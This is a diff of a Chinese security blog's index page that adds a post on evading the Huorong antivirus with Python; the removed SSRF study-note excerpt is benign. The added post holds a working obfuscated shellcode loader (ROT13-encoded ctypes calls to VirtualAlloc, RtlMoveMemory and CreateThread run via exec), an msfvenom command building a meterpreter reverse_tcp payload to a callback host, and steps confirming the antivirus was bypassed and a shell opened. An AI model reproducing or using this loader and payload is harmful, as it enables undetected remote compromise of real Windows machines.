@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -162,7 +162,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-count">38</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -184,6 +184,104 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yuanjiu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/" class="post-title-link" itemprop="url">python免杀火绒</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-04-12 14:41:04 / 修改时间：16:46:36" itemprop="dateCreated datePublished" datetime="2023-04-12T14:41:04+08:00">2023-04-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">实验</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>sd</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"># 定义 ROT13 函数，用于加密/解密</span><br><span class="line">def rot13(message):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    for item in message:</span><br><span class="line">        if (ord(item)&gt;= ord(&#x27;A&#x27;) and ord(item)&lt;= ord(&#x27;M&#x27;)) or (ord(item)&gt;= ord(&#x27;a&#x27;) and ord(item)&lt;= ord(&#x27;m&#x27;)):</span><br><span class="line">            res += chr(ord(item)+13)</span><br><span class="line">        elif (ord(item)&gt;= ord(&#x27;N&#x27;) and ord(item)&lt;= ord(&#x27;Z&#x27;)) or (ord(item)&gt;= ord(&#x27;n&#x27;) and ord(item)&lt;= ord(&#x27;z&#x27;)):</span><br><span class="line">            res += chr(ord(item)-13)</span><br><span class="line">        else:</span><br><span class="line">            res += item</span><br><span class="line">    return res</span><br><span class="line"># 定义 shellcode，这是一个二进制可执行代码，填入shellcode</span><br><span class="line">shellcode=&#x27;&#x27;</span><br><span class="line"># 解析十六进制shellcode并转换为字节对象</span><br><span class="line"></span><br><span class="line">shellcode = bytes.fromhex(shellcode)</span><br><span class="line"></span><br><span class="line"># 定义 ROT13 加密的加载器字符串</span><br><span class="line">loader = &quot;pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)&quot;</span><br><span class="line">exec (rot13(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先用msf生成shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.18.229.138 LPORT=4399 -f c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412145238858.png" alt="image-20230412145238858"></p>
+<p>然后对shellcode进行处理</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412152420499.png" alt="image-20230412152420499"></p>
+<p>用转换.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in open(&#x27;shellcode_RAW.txt&#x27;):</span><br><span class="line">    i = i.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;\\x&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;&quot;&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;;&#x27;,&#x27;&#x27;)</span><br><span class="line">    with open(r&#x27;shellcode.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class="line">        f.write(i)</span><br></pre></td></tr></table></figure>
+
+<p>过火绒<img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412152823295.png" alt="image-20230412152823295"></p>
+<p>启动</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155717923.png" alt="image-20230412155717923"></p>
+<p>打开监听</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155822903.png" alt="image-20230412155822903"></p>
+<p>成功</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155910803.png" alt="image-20230412155910803"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
 
     
 
@@ -981,99 +1079,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86(RottenPotato)web%E6%8F%90%E6%9D%83system/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/06/ssrf%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="yuanjiu">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="元酒InfoSec">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 元酒InfoSec">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/03/06/ssrf%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">ssrf总结</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-03-06 12:56:52" itemprop="dateCreated datePublished" datetime="2023-03-06T12:56:52+08:00">2023-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 15:03:38" itemprop="dateModified" datetime="2023-03-07T15:03:38+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a><strong>SSRF</strong></h2><p>SSRF是由一种攻击者构造请求，由服务器端发起请求的安全漏洞。一般情况下SSRF的攻击目标是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%A4%96%E7%BD%91&spm=1001.2101.3001.7020">外网</a>无法访问到的内部系统。（正因为请求是由服务器发起的，所以服务器端能请求到与自身相连而与外网隔离的内部系统。）</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/06/ssrf%E6%80%BB%E7%BB%93/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
